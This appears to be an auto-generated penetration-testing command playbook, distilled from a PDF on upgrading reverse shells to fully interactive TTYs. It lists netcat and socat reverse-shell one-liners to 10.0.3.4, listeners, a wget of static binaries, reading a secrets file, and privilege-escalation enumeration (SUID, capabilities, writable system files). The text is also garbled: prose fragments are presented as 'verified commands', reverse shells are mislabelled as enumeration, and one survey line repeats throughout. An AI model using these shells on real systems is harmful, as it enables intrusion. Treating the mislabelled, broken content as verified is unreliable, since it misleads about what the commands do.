---
title: "Trained Command Playbook: Upgrading shells to fully interactive TTYs"
category: commands
domain_hub: "[[knowledge/06_linux_unix_administration_processes_and_logging]]"
os_platform: linux
primary_tactic: Passive_Enum
summary: "Verified Windows & Linux command playbook for Upgrading shells to fully interactive TTYs (Passive_Enum): Linux (Debian/Ubuntu/CentOS/RHEL) and UNIX/Solaris system administration, kernel /proc & sysctl internals, ext4/xfs/procfs filesystems,"
when_to_apply: "Apply when working with Upgrading shells to fully interactive TTYs (linux): Apply when enumerating a Linux/UNIX/Solaris host, inspecting `/proc/<PID>` or kernel modules, auditing mounted filesystems (`findmnt`/`lsblk`), managing `systemd` services or signals, hunting SUID/SGID/Capabilities/sudo privilege escalation vectors, reviewing `/var/log`/`journalctl` logs, or upgrading a dumb shell to a full interactive TTY."
tags: [enumeration, https, initial_access_exploitation, mdp, msfvenom, pdf, post_exploitation_verification, privilege_escalation, protocol_chaining, socat, ssh, trained, linux, unix, solaris, systemctl, journalctl, lsof, strace, findmnt, lsblk, sysctl]
source_file: "Upgrading shells to fully interactive TTYs"
updated: 2026-10-30
---

uname -a; cat /etc/os-release; hostnamectl; uptime; id
# Trained Command Playbook: `Upgrading shells to fully interactive TTYs.pdf`
uname -a; cat /etc/os-release; hostnamectl; uptime; id
- **Source Document:** `~/Projects/CORA/Training/Upgrading shells to fully interactive TTYs.pdf`
- **CEGAR Verified Commands:** `15` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `15`
- **Discovered IPs/Subnets:** `10.0.3.4, 10.0.3.7`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_upgrading_shells_to_fully_interactive_ttys]]
uname -a; cat /etc/os-release; hostnamectl; uptime; id
## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_cross_subnet_pivot_routed` | **`Post_Exploitation_Verification`** | Post-Action Host Identity, Privilege & Objective Verification | `netcat` | `s_goal_verified_complete` | `netcat message followed by output from id .` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `nc` | `s_active_services_enumerated` | `nc ‐e /bin/sh 10.0.3.4 4444` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `msfvenom` | `s_initial_shell_or_api_access` | `msfvenom to generate the one-liner commands for me.` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `socat` | `s_protocol_chain_established` | `socat file:`tty`,raw,echo=0 tcp‐listen:4444` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `stty` | `s_interactive_tty_or_priv_escalated` | `stty raw ‐echo` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `nc` | `s_active_services_enumerated` | `nc ‐lvp 4444` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `socat` | `s_protocol_chain_established` | `socat exec:'bash ‐li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `wget` | `s_active_services_enumerated` | `wget ‐q https://github.com/andrew‐d/static‐binaries/raw/master/b` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `netcat` | `s_active_services_enumerated` | `netcat shell to upgrade to a full TTY by setting some stty options` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `export` | `s_active_services_enumerated` | `export SHELL=bash` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `export` | `s_active_services_enumerated` | `export TERM=xterm256‐color` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `stty` | `s_active_services_enumerated` | `stty rows 38 columns 116` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `cat` | `s_active_services_enumerated` | `cat secrets.config` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `export` | `s_active_services_enumerated` | `export TERM=xterm‐256color` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `stty` | `s_active_services_enumerated` | `stty rows <num> columns <cols>` |
uname -a; cat /etc/os-release; hostnamectl; uptime; id
## Verified Executable Commands (Grouped by Capability Layer)
uname -a; cat /etc/os-release; hostnamectl; uptime; id
### General_System (5 commands)
```bash
msfvenom to generate the one-liner commands for me.
export SHELL=bash
export TERM=xterm256‐color
cat secrets.config
export TERM=xterm‐256color
```
uname -a; cat /etc/os-release; hostnamectl; uptime; id
### L1_Serial_OOB (4 commands)
```bash
netcat shell to upgrade to a full TTY by setting some stty options
stty raw ‐echo
stty rows 38 columns 116
stty rows <num> columns <cols>
```
uname -a; cat /etc/os-release; hostnamectl; uptime; id
### L4_Port_Service (5 commands)
```bash
netcat message followed by output from id .
nc ‐e /bin/sh 10.0.3.4 4444
nc ‐lvp 4444
socat file:`tty`,raw,echo=0 tcp‐listen:4444
socat exec:'bash ‐li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4
```
uname -a; cat /etc/os-release; hostnamectl; uptime; id
### L7_HTTP_Web (1 commands)
```bash
wget ‐q https://github.com/andrew‐d/static‐binaries/raw/master/b
```
uname -a; cat /etc/os-release; hostnamectl; uptime; id

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `Upgrading shells to fully interactive TTYs`

> **Domain Hub:** [[knowledge/06_linux_unix_administration_processes_and_logging|Domain Hub 06: Linux, UNIX & Solaris Administration, Kernel (/proc & sysctl), Filesystems, Boot/systemd, Processes, Permissions/SUID & Logging]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when enumerating a Linux/UNIX/Solaris host, inspecting `/proc/<PID>` or kernel modules, auditing mounted filesystems (`findmnt`/`lsblk`), managing `systemd` services or signals, hunting SUID/SGID/Capabilities/sudo privilege escalation vectors, reviewing `/var/log`/`journalctl` logs, or upgrading a dumb shell to a full interactive TTY.  
> **15-Engine H-MDP State Transition:** `s_init_unknown` $\xrightarrow{\text{Passive_Enum}}$ `s_interactive_tty_or_priv_escalated` | **Bayesian Root-Cause Triggers:** `suid_or_capability_privesc_vector, writable_systemd_or_cron_script, unlinked_proc_binary_execution, dumb_shell_missing_pty` | **Isolation:** `RED, BLUE, WHITE (100% local host telemetry compatible)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `uname -a; cat /etc/os-release; hostnamectl; uptime; id` | **Linux Bash** | Collects kernel version, architecture, OS distribution, hostname, system load, and current user UID/GID/groups (`[[commands/trained_centos-debian-survey]]`). | Apply first on any Linux/UNIX system (`s_init_unknown`) to establish OS and privilege baseline. | `systeminfo && whoami /all` |
| `ps auxef && ps -eo pid,ppid,user,stat,lstart,args --forest` | **Linux Bash** | Displays full process tree (`--forest`), UID, PID, PPID, start timestamp, and full command line (`[[commands/trained_cqc001_e050_m050_process_and_signals]]`). | Apply to identify running daemons, abnormal child processes, or processes executing from `/tmp` or `/dev/shm`. | `wmic process get ProcessId,ParentProcessId,ExecutablePath,CommandLine` |
| `sudo ls -la /proc/<PID>/exe /proc/<PID>/cwd /proc/<PID>/fd && tr '\0' '\n' < /proc/<PID>/environ` | **Linux Bash** | Inspects the live kernel `/proc/<PID>` binary link (`exe`), working directory (`cwd`), open descriptors (`fd`), and environment variables (`environ`). | Apply during Linux live forensics: recovers deleted binaries (`cp /proc/<PID>/exe /tmp/recovered`) and exposes secrets in process environments. | `handle -accepteula -a -p <PID>` |
| `systemctl list-units --type=service --state=running && systemctl list-timers --all` | **Linux Bash** | Lists all active `systemd` services and scheduled timers (`[[commands/trained_cqc001_e050_m040_boot_init_login]]`). | Apply to audit running services and periodic scheduled tasks on modern `systemd` distributions. | `sc query state= active && schtasks /query` |
| `df -hT && lsblk -f && findmnt` | **Linux Bash** | Lists mounted filesystems with filesystem type (`ext4`, `xfs`, `tmpfs`), block device hierarchy, UUIDs, and mount flags (`noexec`, `nosuid`) (`[[knowledge/trained_cqc001_e050_m030_filesystems]]`). | Apply to inspect storage layout and verify which writable directories (`/tmp`, `/var/tmp`, `/dev/shm`) allow binary execution. | `wmic logicaldisk get DeviceID,FileSystem,FreeSpace,Size` |
| `sudo -l && find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null && getcap -r / 2>/dev/null` | **Linux Bash** | Audits allowed `sudo` commands, SUID root binaries (`-perm -4000`), and POSIX file capabilities (`getcap -r /`) (`[[commands/trained_cqc001_e060_m010_users_and_permissions]]`). | Apply immediately during Linux privilege escalation (`s_initial_shell_or_api_access -> s_interactive_tty_or_priv_escalated`). | `whoami /priv && accesschk -accepteula -uwcqv *` |
| `find / -writable -type f \( -path "/etc/*" -o -path "/usr/*" -o -path "/opt/*" -o -path "/var/spool/cron/*" \) 2>/dev/null` | **Linux Bash** | Finds misconfigured world- or group-writable config files, service units, and scripts across system directories. | Apply to detect writable `/etc/passwd`, `/etc/systemd/system/*.service`, or cron jobs executed by root. | `accesschk -accepteula -uwqv "Users" C:\Windows\*` |
| `journalctl -xe --no-pager -n 100 && sudo grep -E "Accepted\|Failed\|sudo\|session opened" /var/log/auth.log /var/log/secure 2>/dev/null \| tail -n 50` | **Linux Bash** | Queries `systemd-journald` and `rsyslog` auth logs (`auth.log` on Debian/Ubuntu, `secure` on RHEL/CentOS) (`[[commands/trained_logging-cmds]]`). | Apply when auditing SSH logins, `sudo` usage, or service startup failures. | `wevtutil qe Security /c:30 /rd:true /f:text` |
| `python3 -c 'import pty; pty.spawn("/bin/bash")' \|\| script -qc /bin/bash /dev/null` | **Linux Bash** | Allocates a kernel pseudo-terminal (`PTY`) to upgrade a non-interactive netcat/reverse shell into a full interactive TTY (`[[knowledge/trained_upgrading_shells_to_fully_interactive_ttys]]`). | Apply whenever `sudo`, `su`, `ssh`, or `vim` fails with `standard in must be a tty` or `no tty present`. | `Enter-PSSession` |
| `uname -a; showrev -p; ifconfig -a; netstat -rn; ps -ef; svcs -a` | **Solaris / UNIX** | Solaris (`SunOS`) system, patch (`showrev -p`), interface (`ifconfig -a`), routing (`netstat -rn`), and SMF service (`svcs -a`) survey (`[[commands/trained_solaris-survey]]`). | Apply when operating on legacy Solaris / SunOS UNIX enterprise servers. | `systeminfo && ipconfig /all && sc query` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [Linux Bash] Collects kernel version, architecture, OS distribution, hostname, system load, and current user UID/GID/groups (`[[commands/trained_centos-debian-survey]]`).
uname -a; cat /etc/os-release; hostnamectl; uptime; id
# [Linux Bash] Displays full process tree (`--forest`), UID, PID, PPID, start timestamp, and full command line (`[[commands/trained_cqc001_e050_m050_process_and_signals]]`).
ps auxef && ps -eo pid,ppid,user,stat,lstart,args --forest
# [Linux Bash] Inspects the live kernel `/proc/<PID>` binary link (`exe`), working directory (`cwd`), open descriptors (`fd`), and environment variables (`environ`).
sudo ls -la /proc/<PID>/exe /proc/<PID>/cwd /proc/<PID>/fd && tr '\0' '\n' < /proc/<PID>/environ
# [Linux Bash] Lists all active `systemd` services and scheduled timers (`[[commands/trained_cqc001_e050_m040_boot_init_login]]`).
systemctl list-units --type=service --state=running && systemctl list-timers --all
# [Linux Bash] Lists mounted filesystems with filesystem type (`ext4`, `xfs`, `tmpfs`), block device hierarchy, UUIDs, and mount flags (`noexec`, `nosuid`) (`[[knowledge/trained_cqc001_e050_m030_filesystems]]`).
df -hT && lsblk -f && findmnt
# [Linux Bash] Audits allowed `sudo` commands, SUID root binaries (`-perm -4000`), and POSIX file capabilities (`getcap -r /`) (`[[commands/trained_cqc001_e060_m010_users_and_permissions]]`).
sudo -l && find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null && getcap -r / 2>/dev/null
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
